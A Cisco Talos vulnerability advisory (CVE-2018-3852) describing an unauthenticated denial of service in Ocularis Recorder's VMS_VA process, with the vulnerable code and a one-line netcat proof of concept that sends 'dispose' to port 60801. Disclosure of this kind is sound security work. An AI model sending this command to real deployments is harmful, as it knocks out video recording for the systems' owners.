# Talos Vulnerability Report

### TALOS-2018-0535

## Ocularis Recorder VMS\_VA Denial of Service Vulnerability

##### June 5, 2018

##### CVE Number

CVE-2018-3852

### Summary

An exploitable denial of service vulnerability exists in the Ocularis Recorder functionality of Ocularis 5.5.0.242. A specially crafted TCP packet can cause a process to terminate resulting in denial of service. An attacker can send a crafted TCP packet to trigger this vulnerability.

### Tested Versions

Ocularis Recorder 5.5.0.242

### Product URLs

<https://onssi.com/>

### CVSSv3 Score

7.5 - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

### CWE

CWE-250 - Execution with Unnecessary Privileges

### Details

This binary listens for incoming TCP connections. When a client connects to this binary and sends any non expected data, the binary will respond with “Hello World!”. If the server receives the dispose command it will terminate the VMS\_VA process.

```
this.tcpListener = new TcpListener(IPAddress.Any, 60801 + ConfigID);
Thread thread = new Thread(new ThreadStart(this.ListenForClients))
{
    Name = "VA CommServer V4 Listener"
};
..........
if (str.StartsWith("dispose"))
{
    this.Running = false;
    bytes = Encoding.Default.GetBytes("Ack!");
}

```

The binary has a check to see if the receiving data starts with “dispose”. If it does the “this.Running” variable will be set to false which results in the process killing itself. There is no authentication required for this command to go through.

### Crash Information

N/A

### Exploit Proof-of-Concept

```
$ echo "dispose" | nc -nv 192.168.56.102 60801
192.168.56.102 60801 open
Ack!

```
### Mitigation

This vulnerability can be mitigated by not allowing VMS\_VA.exe from accepting inbound connections. It is unclear if this will have any adverse affect on the Ocularis Recorder module as the product documentation explicitly states to allow inbound traffic to this binary.

### Timeline

2018-03-05 - Vendor Disclosure

2018-06-04 - Public Release

Discovered by Carlos Pacho of Cisco Talos.
